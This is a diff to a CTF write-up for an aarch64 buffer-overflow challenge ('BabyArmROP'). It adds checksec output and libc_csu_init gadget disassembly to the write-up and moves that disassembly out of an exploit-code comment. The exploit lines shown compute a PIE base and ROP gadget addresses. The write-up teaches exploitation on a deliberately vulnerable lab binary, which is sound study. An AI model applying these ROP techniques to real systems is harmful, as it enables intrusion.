@@ -38,10 +38,37 @@ int main() {
 ```
 
 ## Analysis:
+```
+ checksec vuln
+[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/vuln'
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
 
+This challenge has a simple buffer overflow vulnerability of aarch64.
 
 ## Solution:
 
+I made rop chain using the following `libc_csu_init` rop gadget. 
+
+```
+ 900:	f8737aa3 	ldr	x3, [x21, x19, lsl #3]
+ 904:	aa1803e2 	mov	x2, x24
+ 908:	91000673 	add	x19, x19, #0x1
+ 90c:	aa1703e1 	mov	x1, x23
+ 910:	2a1603e0 	mov	w0, w22
+ 914:	d63f0060 	blr	x3
+ 918:	eb13029f 	cmp	x20, x19
+ 91c:	54ffff21 	b.ne	900 <__libc_csu_init+0x48>  // b.any
+ 920:	a94153f3 	ldp	x19, x20, [sp, #16]
+ 924:	a9425bf5 	ldp	x21, x22, [sp, #32]
+ 928:	a94363f7 	ldp	x23, x24, [sp, #48]
+ 92c:	a8c47bfd 	ldp	x29, x30, [sp], #64
+ 930:	d65f03c0 	ret
+```
 
 ## Exploit code:
 ```python
@@ -77,22 +104,6 @@ pie_leak = u64(r + b"\x00"*4)
 pie_base = pie_leak - 0x8a8
 print("pie_leak =", hex(pie_leak))
 print("pie_base =", hex(pie_base)) 
-
-'''
- 900:	f8737aa3 	ldr	x3, [x21, x19, lsl #3]
- 904:	aa1803e2 	mov	x2, x24
- 908:	91000673 	add	x19, x19, #0x1
- 90c:	aa1703e1 	mov	x1, x23
- 910:	2a1603e0 	mov	w0, w22
- 914:	d63f0060 	blr	x3
- 918:	eb13029f 	cmp	x20, x19
- 91c:	54ffff21 	b.ne	900 <__libc_csu_init+0x48>  // b.any
- 920:	a94153f3 	ldp	x19, x20, [sp, #16]
- 924:	a9425bf5 	ldp	x21, x22, [sp, #32]
- 928:	a94363f7 	ldp	x23, x24, [sp, #48]
- 92c:	a8c47bfd 	ldp	x29, x30, [sp], #64
- 930:	d65f03c0 	ret
-'''
 
 libc_csu_init1 = pie_base + 0x920
 libc_csu_init2 = pie_base + 0x900
